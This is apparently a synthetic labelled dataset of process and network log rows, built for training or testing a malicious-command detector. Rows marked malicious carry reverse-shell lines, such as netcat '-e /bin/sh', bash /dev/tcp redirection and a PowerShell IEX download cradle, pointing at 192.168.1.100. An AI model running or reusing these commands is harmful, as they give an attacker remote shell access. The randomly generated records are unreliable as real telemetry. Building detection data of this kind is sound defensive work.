timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-02-24 15:10:45.536484,6fd8ffea,init,svchost.exe,104.144.185.240,22.145.150.221,443,TCP,4809,3561,35.79,ls,0
2025-03-10 05:01:44.787594,62276a51,init,notepad.exe,184.29.213.179,4.106.28.88,443,UDP,1232,1254,43.49,dir,0
2025-03-15 21:21:46.385880,e0ae0f8f,init,nc,75.116.111.230,244.250.247.200,443,TCP,995,3785,52.35,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-15 08:30:45.884608,49fc7369,systemd,notepad.exe,176.41.102.108,246.151.98.83,4444,UDP,135,2599,51.35,"python -c 'import socket,subprocess'",1
2025-04-09 00:13:45.253964,e9c4e0c2,explorer.exe,explorer.exe,213.203.186.78,1.32.17.161,443,UDP,4993,4043,23.65,ls,0
2025-04-12 23:30:46.326386,584355b7,init,svchost.exe,6.124.51.183,250.46.249.113,3389,TCP,4568,4816,6.21,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-25 08:35:45.474431,1ce66aee,init,python.exe,48.67.50.179,68.199.35.90,1337,TCP,1044,1896,31.92,ls,0
2025-04-27 20:49:45.920453,36f432e0,svchost.exe,explorer.exe,33.144.46.16,241.94.72.30,1337,TCP,3550,3494,17.62,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-06 17:45:46.307513,bb4ba9c2,explorer.exe,powershell,138.47.30.216,79.148.165.53,3389,UDP,484,782,31.2,"python -c 'import socket,subprocess'",1
2025-04-18 23:57:45.606687,6dcec372,explorer.exe,chrome.exe,27.58.38.189,203.43.18.224,8080,TCP,1936,2930,46.25,ping,0
2025-03-14 00:27:45.420392,1ecf4cf4,systemd,powershell,20.188.142.41,120.151.89.66,1337,UDP,2758,3259,4.35,cd,0
2025-04-27 07:20:45.831517,4fb29941,svchost.exe,nc,241.122.36.48,152.206.179.90,22,TCP,1301,827,22.45,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-28 13:33:45.119133,eee0fa92,svchost.exe,nc,9.92.96.170,207.13.235.222,443,UDP,796,4435,4.62,ipconfig,0
2025-04-02 19:42:44.786908,75cdd545,svchost.exe,svchost.exe,35.216.25.153,134.144.197.30,3389,TCP,3928,4099,33.26,ipconfig,0
2025-02-22 17:52:44.882957,438a83f3,explorer.exe,bash,118.204.152.217,164.14.22.169,8080,UDP,1441,1342,51.13,ipconfig,0
2025-04-02 11:15:46.084952,d0379f8b,svchost.exe,chrome.exe,207.72.186.139,45.25.132.193,1337,UDP,2451,103,37.62,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-15 14:21:44.753147,0e8807c7,svchost.exe,powershell,47.226.5.161,181.133.221.48,3389,UDP,1794,3878,16.15,ipconfig,0
2025-02-22 12:53:45.737524,cfb6b1fd,systemd,perl,18.207.72.143,157.141.77.189,22,UDP,2364,4321,54.42,"python -c 'import socket,subprocess'",1
2025-04-12 09:21:46.034955,90218af0,systemd,chrome.exe,161.253.56.153,30.46.91.234,4444,TCP,1252,775,47.08,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-29 17:22:45.727320,9c955699,explorer.exe,perl,157.190.106.63,175.20.235.2,3389,TCP,70,1025,39.48,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-25 17:13:44.751284,709dc57a,explorer.exe,chrome.exe,250.45.215.182,178.232.171.204,443,TCP,1998,1007,2.56,ping,0
2025-04-02 15:23:46.406965,bbbe99ca,systemd,notepad.exe,233.54.62.136,206.237.94.4,4444,TCP,1666,464,3.7,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-16 07:28:45.619538,02fc11b5,explorer.exe,powershell,43.65.108.43,17.97.76.209,1337,UDP,4209,414,50.5,ping,0
2025-04-09 04:56:44.951945,2dce98fc,init,chrome.exe,223.253.234.13,9.134.197.85,3389,TCP,2604,441,58.35,dir,0
2025-04-25 19:20:45.627934,e1f0fcb2,systemd,chrome.exe,41.179.113.135,5.154.16.230,8080,TCP,3135,4925,35.54,dir,0
2025-04-14 02:20:45.497706,a34902d5,init,chrome.exe,19.81.80.212,45.145.193.57,8080,UDP,4311,689,50.45,cd,0
2025-03-30 23:39:45.014087,887b78e0,svchost.exe,cmd.exe,223.90.192.4,73.80.107.44,4444,TCP,2583,2435,59.82,dir,0
2025-04-17 04:00:45.374714,f6c55ed1,systemd,chrome.exe,95.131.128.63,87.229.46.9,3389,TCP,1919,3828,48.62,ping,0
2025-03-19 10:01:45.942832,805d46c1,svchost.exe,explorer.exe,64.166.80.245,23.134.81.19,1337,UDP,2835,497,40.99,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-21 14:05:45.910582,39f193a6,explorer.exe,perl,149.180.91.155,106.247.180.51,4444,UDP,4515,1930,54.36,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-30 08:56:44.991064,f8456285,explorer.exe,svchost.exe,12.127.239.77,207.153.161.140,22,UDP,3172,905,5.28,ipconfig,0
2025-03-13 15:21:45.265301,9ee792bc,init,notepad.exe,157.107.215.50,238.175.58.26,8080,UDP,3475,1857,14.56,dir,0
2025-04-22 06:13:45.351842,44d85375,init,python.exe,28.50.48.169,120.154.73.167,3389,UDP,2787,924,29.7,ls,0
2025-04-13 05:04:45.203099,ee96aac2,explorer.exe,chrome.exe,107.179.3.48,233.201.71.129,8080,UDP,3379,2003,39.68,cd,0
2025-04-25 11:04:45.289078,4fe8aa9f,systemd,explorer.exe,173.82.128.131,196.93.79.37,443,TCP,2400,1487,21.43,dir,0
2025-04-05 03:40:45.242173,2d481a69,systemd,svchost.exe,168.46.200.102,243.75.124.210,443,UDP,4337,4254,0.44,dir,0
2025-04-20 23:34:45.716726,8d05efd5,init,python.exe,41.110.138.143,85.37.41.81,3389,UDP,3706,1733,43.26,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-08 21:09:45.545919,acb0fb39,svchost.exe,cmd.exe,107.41.158.213,49.212.253.138,3389,TCP,2007,4407,45.36,dir,0
2025-03-18 19:39:46.286096,7a1e8890,systemd,notepad.exe,162.10.99.145,28.183.251.97,1337,TCP,2500,2304,6.28,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-13 19:49:45.433386,6a4e6387,init,chrome.exe,228.96.81.236,15.37.252.205,443,UDP,4611,2202,41.69,cd,0
2025-04-27 03:33:45.246685,9d32f2a0,svchost.exe,svchost.exe,225.246.236.185,156.231.249.48,22,TCP,3747,888,15.23,ipconfig,0
2025-04-24 04:07:46.004872,3bcc1548,systemd,powershell,10.152.119.23,131.53.10.20,443,UDP,2979,1848,11.71,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-15 01:01:45.571680,d18d878c,svchost.exe,powershell,41.145.22.110,160.33.132.65,22,UDP,232,2210,37.54,ipconfig,0
2025-04-21 23:22:44.983671,e513d82a,explorer.exe,nc,248.27.67.2,175.132.221.194,3389,UDP,4047,4771,45.59,dir,0
2025-03-30 13:28:45.479817,fa79cbdb,init,cmd.exe,33.3.217.167,71.11.106.244,1337,TCP,3220,3606,2.62,cd,0
2025-04-15 11:56:45.715535,b9aa2d92,systemd,svchost.exe,154.154.60.51,206.84.191.74,3389,TCP,2514,3896,6.5,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-17 11:11:45.633292,976ecb9a,svchost.exe,explorer.exe,63.27.226.216,109.187.161.108,8080,TCP,3598,1966,44.26,ping,0
2025-03-18 16:35:45.462649,846b2f58,explorer.exe,chrome.exe,92.166.189.48,156.28.68.203,22,UDP,2389,1818,44.82,cd,0
2025-04-27 16:43:45.504458,c967faed,systemd,powershell,252.28.202.230,108.94.164.50,22,TCP,4684,4776,59.34,ls,0
2025-03-13 01:08:46.117187,3143dc12,explorer.exe,perl,141.231.239.78,175.151.38.78,22,TCP,2168,4681,21.69,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-29 20:48:45.862504,064f3ab3,init,perl,94.126.152.222,142.170.217.47,8080,UDP,2188,2750,20.83,"python -c 'import socket,subprocess'",1
2025-04-30 06:00:45.853725,a318d4ab,init,explorer.exe,36.254.185.184,147.104.36.50,8080,TCP,2940,4530,33.16,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-11 23:55:45.520994,372a4f25,systemd,nc,29.152.12.226,129.43.143.168,3389,TCP,1271,1589,21.57,cd,0
2025-04-07 01:44:45.634189,0b7f0cf3,systemd,chrome.exe,137.215.76.248,141.71.201.69,3389,TCP,3087,1830,8.04,ipconfig,0
2025-03-22 16:57:45.712895,6135915f,explorer.exe,perl,86.81.139.131,168.26.79.177,8080,UDP,4432,2570,54.59,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-02 00:34:44.826793,2990fa7e,svchost.exe,svchost.exe,219.180.227.23,203.127.30.53,443,TCP,4825,2584,55.58,dir,0
2025-02-22 12:37:44.914847,b2df0426,svchost.exe,cmd.exe,119.43.154.24,183.245.178.229,443,TCP,1057,1356,57.87,ping,0
2025-03-20 05:00:46.103531,f85bcf81,svchost.exe,perl,243.28.254.252,39.7.139.30,22,TCP,3592,2940,33.85,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-16 19:16:45.527279,24bc7a7c,svchost.exe,notepad.exe,30.34.220.100,224.194.203.92,4444,UDP,1673,1093,53.02,ls,0
2025-04-05 17:14:45.184610,debd75a2,init,chrome.exe,82.73.145.109,2.249.25.186,443,TCP,2574,4441,45.36,ls,0
2025-04-20 12:19:45.469762,f55b7453,svchost.exe,nc,91.94.105.254,89.232.152.57,22,UDP,127,424,12.4,ping,0
2025-04-11 06:48:44.814104,32ee8ffe,svchost.exe,explorer.exe,178.12.108.248,6.239.136.37,8080,UDP,355,2674,24.06,cd,0
2025-03-27 14:58:45.149391,ab2427d8,explorer.exe,perl,12.14.194.233,47.244.132.135,1337,TCP,4088,1667,11.53,ls,0
2025-03-10 08:25:45.873006,5ada0598,init,explorer.exe,187.231.82.168,14.125.53.33,4444,TCP,405,3428,31.89,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-25 02:56:46.225240,123eca37,svchost.exe,nc,39.128.52.180,164.42.18.157,3389,TCP,2290,2976,3.41,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-28 18:39:45.646111,87e6da39,systemd,svchost.exe,194.209.76.64,56.184.167.16,443,TCP,3909,838,12.5,dir,0
2025-04-09 17:27:44.953056,58189d8e,svchost.exe,perl,123.155.63.169,224.194.201.202,1337,TCP,1713,2063,30.38,ls,0
2025-04-28 06:20:45.633226,86c869d2,svchost.exe,perl,172.120.71.229,119.154.89.234,3389,UDP,3536,2194,19.47,dir,0
2025-04-17 08:32:45.811244,0a3e15fd,init,nc,163.11.249.222,63.121.167.135,4444,TCP,4311,3070,19.67,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-20 20:05:45.210633,330d33d5,svchost.exe,explorer.exe,165.24.244.214,216.84.94.159,22,TCP,2689,1684,45.61,cd,0
2025-03-22 21:37:44.894749,801157ed,systemd,perl,82.47.87.123,65.123.123.124,4444,TCP,3642,1342,4.85,ls,0
2025-04-11 18:46:45.230349,1eae0ddc,init,notepad.exe,247.119.247.214,182.45.113.106,8080,TCP,4795,3735,56.36,ipconfig,0
2025-04-16 11:35:45.377117,bc9e9890,init,perl,129.21.54.116,122.66.99.138,3389,UDP,2944,488,31.7,ping,0
2025-03-18 08:49:46.363090,6eba992c,systemd,perl,110.11.83.37,178.180.9.185,8080,UDP,578,2920,0.68,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-21 06:01:45.017221,a2434527,systemd,chrome.exe,191.188.148.96,16.20.7.33,443,TCP,1644,1344,43.3,dir,0
2025-03-20 14:01:46.050140,264b16a8,systemd,powershell,251.191.126.61,209.78.104.173,22,UDP,1794,197,47.8,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-28 02:13:45.070190,b526299b,systemd,chrome.exe,22.222.43.222,22.193.254.95,22,TCP,407,4569,32.47,dir,0
2025-03-28 11:46:45.090796,e4526a9c,systemd,nc,149.126.228.104,238.2.65.12,443,UDP,948,4415,51.95,ls,0
2025-03-14 18:09:46.181611,a2b40aba,explorer.exe,notepad.exe,193.133.87.79,215.247.25.229,3389,TCP,2207,2615,41.28,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-10 08:24:45.603417,5e41f223,init,python.exe,13.50.151.190,7.162.76.102,1337,TCP,160,3897,49.23,dir,0
2025-03-20 10:45:45.391525,2ee1e827,systemd,explorer.exe,14.243.222.113,113.50.7.203,3389,TCP,2408,196,24.24,ipconfig,0
2025-03-29 05:09:45.795364,3d66b1d8,svchost.exe,powershell,177.197.59.80,104.168.163.155,22,UDP,601,304,31.46,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-18 17:41:44.955078,cd140a7e,svchost.exe,perl,248.234.183.205,71.159.238.186,22,UDP,4395,4306,52.29,dir,0
2025-03-13 22:12:46.255349,e25a5134,explorer.exe,powershell,202.16.190.100,95.57.83.46,4444,TCP,2100,2441,8.41,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-09 07:24:44.771904,71bd5541,explorer.exe,python.exe,160.197.104.240,66.144.139.165,1337,TCP,684,4904,9.23,ls,0
2025-02-26 11:22:45.204383,50b991db,init,bash,131.188.14.210,220.77.6.89,22,TCP,1360,4062,57.47,ls,0
2025-03-28 03:50:46.082251,6cce9409,explorer.exe,perl,179.157.23.172,207.79.210.187,1337,TCP,4815,4049,56.01,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-23 18:04:46.322202,1e3c1c78,systemd,perl,48.195.32.196,105.189.191.198,22,UDP,3887,1443,19.26,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-26 08:34:45.213270,65b515a6,explorer.exe,python.exe,169.96.78.225,214.238.28.244,1337,TCP,4818,4653,5.24,dir,0
2025-03-22 01:44:46.205536,c58c0589,explorer.exe,explorer.exe,159.233.7.49,42.98.228.38,3389,TCP,228,2003,18.31,"python -c 'import socket,subprocess'",1
2025-04-05 20:40:46.189155,61b73a6b,systemd,svchost.exe,201.142.241.237,80.112.249.145,443,UDP,1657,362,41.88,"python -c 'import socket,subprocess'",1
2025-03-21 01:18:45.600498,cef199eb,init,powershell,102.128.113.212,214.64.68.187,8080,UDP,1475,4908,2.59,ping,0
2025-04-29 16:47:45.613652,92844519,systemd,perl,46.204.41.47,178.57.211.35,3389,UDP,1813,1044,16.97,ipconfig,0
2025-04-01 14:40:44.755919,662bc689,init,chrome.exe,166.237.1.156,122.2.231.3,1337,TCP,3434,4603,53.73,cd,0
2025-04-27 10:15:45.791712,069a2020,svchost.exe,notepad.exe,167.160.70.172,77.72.161.29,22,TCP,438,2274,48.89,"python -c 'import socket,subprocess'",1
2025-02-23 13:03:46.231784,357b4661,systemd,python.exe,141.193.187.104,203.88.181.187,8080,UDP,2698,2725,38.32,"python -c 'import socket,subprocess'",1
2025-04-30 12:36:45.088804,7111aa35,init,powershell,141.157.87.243,3.206.148.18,4444,UDP,1512,4137,56.03,dir,0
2025-04-25 17:35:45.901669,14d636df,init,svchost.exe,118.36.170.93,67.129.117.242,1337,UDP,4590,2754,32.76,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-09 04:12:45.871716,509e5629,systemd,python.exe,12.35.49.55,128.239.230.56,8080,TCP,4860,2652,46.76,"python -c 'import socket,subprocess'",1
2025-04-15 10:06:44.931786,ad0cd6f8,explorer.exe,explorer.exe,40.158.230.197,67.210.228.138,22,UDP,3525,4273,31.56,ipconfig,0
2025-04-10 14:24:46.375661,c66679f0,systemd,svchost.exe,3.126.217.63,42.102.109.97,8080,UDP,2796,1540,23.19,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-20 21:17:45.234975,0c26b207,systemd,notepad.exe,234.198.243.115,191.86.86.42,22,UDP,3100,512,48.67,ls,0
2025-04-24 23:03:45.953722,5355f9ed,systemd,svchost.exe,92.164.125.1,81.129.167.136,22,UDP,1823,3839,25.46,"python -c 'import socket,subprocess'",1
2025-03-29 14:32:45.854919,aa823562,init,nc,149.109.115.110,221.44.24.221,8080,TCP,1590,4371,12.34,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-21 21:30:46.113879,07317e0a,explorer.exe,cmd.exe,133.52.17.132,231.232.6.69,3389,TCP,1691,4790,51.83,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-24 20:51:46.038866,c84369f0,init,explorer.exe,40.111.242.233,206.221.38.155,22,TCP,2989,3478,21.63,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-15 00:47:46.138111,4d06904e,explorer.exe,nc,93.63.139.110,88.183.50.136,1337,TCP,2611,1767,20.48,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-28 10:58:46.239095,1145bd0a,init,cmd.exe,250.177.8.18,192.214.161.51,1337,TCP,2229,927,54.59,"python -c 'import socket,subprocess'",1
2025-04-25 08:00:45.965304,26a2a60f,explorer.exe,notepad.exe,27.234.33.158,237.21.34.138,4444,UDP,197,394,40.3,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-23 17:31:45.279728,fd92022b,systemd,svchost.exe,231.146.7.180,109.40.71.80,22,UDP,1988,3780,13.66,dir,0
2025-04-20 18:41:45.603989,3ab9e54c,init,explorer.exe,175.130.48.106,23.142.120.180,4444,TCP,3255,754,59.75,ipconfig,0
2025-04-21 19:30:45.118925,64e7b67c,init,cmd.exe,133.231.96.9,250.109.27.218,3389,UDP,4792,4847,25.63,ping,0
2025-02-21 21:19:44.969288,38579cdf,init,powershell,202.58.58.242,134.228.34.216,1337,UDP,2897,3507,7.37,cd,0
2025-03-06 08:34:45.713754,2a448b36,init,perl,205.25.53.183,186.34.244.173,4444,UDP,3732,1722,36.34,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-08 20:17:45.037734,2cf84a43,init,powershell,145.195.234.16,57.239.69.121,8080,UDP,2290,4778,21.03,ipconfig,0
2025-03-24 00:04:45.362332,07809725,systemd,perl,13.201.25.66,170.127.207.221,22,UDP,4433,4237,14.56,dir,0
2025-03-22 10:00:45.536450,2f90e10f,explorer.exe,svchost.exe,35.193.138.174,86.128.176.46,1337,UDP,2337,3850,29.33,ipconfig,0
2025-04-27 12:23:45.728432,43bcfa2c,init,svchost.exe,80.71.187.157,59.245.110.170,22,UDP,2787,3443,43.48,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-12 00:35:45.811474,2e82cdd1,init,explorer.exe,29.155.95.2,129.128.212.27,22,TCP,4344,264,0.55,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-04 14:15:45.270587,53334781,systemd,nc,187.89.250.223,146.233.119.8,443,UDP,1681,2883,38.67,cd,0
2025-04-07 08:56:45.277716,49a1955f,explorer.exe,python.exe,41.105.128.130,209.144.248.147,4444,UDP,1894,4327,13.32,ping,0
2025-03-19 02:16:44.926148,8c283fbf,systemd,bash,80.224.250.131,122.29.58.12,22,TCP,1489,2863,21.21,cd,0
2025-04-18 15:03:45.993042,ac60b77b,explorer.exe,nc,123.141.118.232,244.124.145.214,22,TCP,4801,565,21.2,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-25 05:35:45.123568,2becce42,init,python.exe,136.81.140.182,177.182.43.38,8080,TCP,3012,3312,8.67,ping,0
2025-03-19 22:02:45.834476,a4577436,systemd,nc,62.152.31.238,167.37.83.99,3389,TCP,734,1128,4.99,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-28 15:39:46.201000,9261d4db,svchost.exe,nc,19.102.101.190,185.31.65.216,8080,UDP,126,317,20.27,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-26 13:01:44.999057,fe0ce2ec,explorer.exe,powershell,194.144.131.201,67.198.166.200,1337,TCP,2538,696,25.4,cd,0
2025-03-05 15:43:46.216088,48e7e82d,systemd,perl,222.170.91.31,166.54.112.179,4444,TCP,1301,301,4.29,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-27 22:33:46.102799,d4f42b94,init,cmd.exe,246.230.189.2,161.190.33.128,8080,TCP,901,3126,8.54,"python -c 'import socket,subprocess'",1
2025-03-14 01:07:46.397381,5eb702e8,systemd,notepad.exe,195.230.93.69,227.112.116.62,3389,UDP,2678,4769,42.28,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-26 17:25:46.094542,616cb817,systemd,svchost.exe,75.192.9.149,188.222.111.107,4444,TCP,2197,1810,52.76,"python -c 'import socket,subprocess'",1
2025-04-22 07:05:45.530948,a18b17de,init,svchost.exe,215.16.250.80,26.207.64.40,22,UDP,3869,1306,17.2,ipconfig,0
2025-02-21 08:55:46.341316,7bf89846,init,explorer.exe,74.150.116.208,175.116.242.137,443,UDP,2513,87,56.89,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-20 01:16:45.201546,29e60130,systemd,powershell,120.30.192.199,21.253.106.74,3389,UDP,4553,4402,50.19,ls,0
2025-04-23 14:42:45.702140,ead37244,init,explorer.exe,200.254.93.80,167.225.237.103,8080,TCP,1667,3186,10.31,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-10 04:19:45.127077,19dd61cc,systemd,powershell,98.62.183.14,137.44.83.200,443,TCP,202,2925,16.02,dir,0
2025-03-11 13:58:44.945976,126f339e,svchost.exe,python.exe,116.15.94.53,209.47.11.145,1337,TCP,3132,675,13.35,dir,0
2025-04-07 21:07:45.890882,b69113de,svchost.exe,chrome.exe,38.92.60.20,199.156.113.225,4444,TCP,2689,2720,54.32,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-22 12:15:45.009105,377011b3,explorer.exe,explorer.exe,171.89.205.112,220.136.180.100,4444,TCP,4745,3276,44.73,cd,0
2025-04-16 12:01:45.310161,70cd1977,svchost.exe,cmd.exe,232.24.216.59,94.97.96.50,22,UDP,1840,2614,39.78,ls,0
2025-03-20 15:31:46.206115,7ae8e807,init,notepad.exe,34.41.12.112,143.91.81.47,4444,UDP,4407,1839,3.79,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-13 06:27:45.065268,798425ff,init,perl,204.216.222.167,12.97.110.147,4444,TCP,2400,2268,1.23,cd,0
2025-03-07 08:54:45.521120,c7993f09,init,bash,75.206.74.9,77.142.73.55,4444,TCP,3310,1227,38.14,cd,0
2025-03-24 12:11:44.831434,f010e9aa,svchost.exe,chrome.exe,137.235.165.7,132.202.208.22,443,TCP,3565,4309,4.1,ipconfig,0
2025-04-06 04:31:45.538651,6b3045b8,explorer.exe,powershell,112.221.87.160,78.78.130.101,8080,UDP,4897,4120,41.22,dir,0
2025-03-02 02:56:45.972057,f6198178,svchost.exe,cmd.exe,197.238.235.12,110.202.46.40,22,TCP,2359,4359,11.96,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-14 21:46:46.248319,c33b1bd6,svchost.exe,perl,102.200.228.206,118.57.126.232,22,TCP,336,4251,16.78,"python -c 'import socket,subprocess'",1
2025-04-13 14:44:44.809989,fae6584a,svchost.exe,powershell,150.8.3.87,120.122.155.81,22,TCP,834,4104,14.68,ping,0
2025-03-29 11:45:44.912008,60fe41dd,svchost.exe,notepad.exe,186.36.151.165,123.123.250.78,22,TCP,2815,72,26.05,ping,0
2025-04-13 06:30:46.087993,99b6231b,svchost.exe,powershell,65.120.143.253,205.17.144.8,4444,UDP,2236,1902,51.73,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-12 13:44:45.594890,7fe217eb,systemd,perl,33.178.74.226,178.201.239.87,8080,UDP,4878,325,13.37,ipconfig,0
2025-04-16 07:16:45.123184,632bb6a3,init,powershell,176.198.210.3,141.183.227.81,3389,UDP,2470,2224,31.36,ls,0
2025-03-29 13:28:46.310539,fb7c0355,systemd,perl,109.21.23.173,98.59.89.94,3389,TCP,1619,4223,56.65,"python -c 'import socket,subprocess'",1
2025-04-03 04:26:46.311137,187c52a1,systemd,chrome.exe,111.143.216.141,195.37.230.41,1337,TCP,4683,3881,45.63,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-31 23:53:45.641171,4e0d545b,init,notepad.exe,212.202.147.47,111.248.161.194,1337,TCP,4390,1344,9.14,dir,0
2025-04-22 22:22:45.585004,039f3948,init,cmd.exe,75.158.113.69,145.22.32.35,1337,UDP,4366,251,37.23,ping,0
2025-04-19 13:23:44.813755,15cd4267,systemd,svchost.exe,129.140.61.182,210.66.161.205,1337,UDP,4471,946,35.48,dir,0
2025-03-15 14:19:45.791515,1d5755e7,svchost.exe,chrome.exe,34.45.22.66,111.51.132.95,1337,TCP,2217,2791,41.8,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-21 05:25:44.757329,79b31827,systemd,bash,59.59.186.192,54.122.60.133,3389,UDP,3829,2840,47.54,ping,0
2025-03-03 18:27:45.586931,e6d27a17,init,cmd.exe,203.195.162.246,181.57.205.20,4444,UDP,2440,1070,9.34,ls,0
2025-03-04 16:01:44.907924,5e1530f5,explorer.exe,powershell,211.63.15.68,121.4.33.126,1337,TCP,1359,3781,25.58,ping,0
2025-04-13 11:48:45.356863,4ca58a89,init,notepad.exe,76.164.31.251,115.177.57.118,22,TCP,1423,1992,48.23,ls,0
2025-03-07 17:20:45.342702,dc826aa1,svchost.exe,notepad.exe,57.31.224.103,98.156.148.144,4444,UDP,252,2931,16.28,ipconfig,0
2025-03-02 07:22:44.962856,820ab9f6,init,svchost.exe,229.78.11.225,87.111.86.189,22,TCP,2933,3737,32.94,dir,0
2025-04-30 01:24:44.777933,86101d31,init,notepad.exe,149.80.233.130,180.165.144.76,3389,TCP,3310,672,12.0,dir,0
2025-03-18 10:44:46.301399,2789bb1e,systemd,perl,97.1.219.244,186.188.168.110,8080,UDP,1322,369,49.11,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-07 21:22:45.392908,646ebb6b,init,explorer.exe,66.101.217.246,197.175.176.42,22,TCP,1506,3439,45.8,cd,0
2025-04-24 07:28:44.797773,1e7b32e4,systemd,cmd.exe,182.252.26.24,96.234.249.219,3389,UDP,4419,4285,38.4,dir,0
2025-02-28 20:57:45.129428,a728be94,svchost.exe,svchost.exe,69.56.82.216,197.98.174.162,443,TCP,254,4452,9.28,ls,0
2025-03-06 06:27:45.749335,70674910,explorer.exe,nc,169.180.197.250,39.252.176.153,3389,TCP,2455,3840,48.76,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-05 11:28:45.125992,e833ea9f,init,notepad.exe,196.24.34.131,106.197.153.206,22,TCP,1211,1050,16.86,cd,0
2025-03-18 05:46:44.956069,db211aff,systemd,bash,141.10.245.224,120.45.153.101,8080,TCP,4289,456,32.15,ls,0
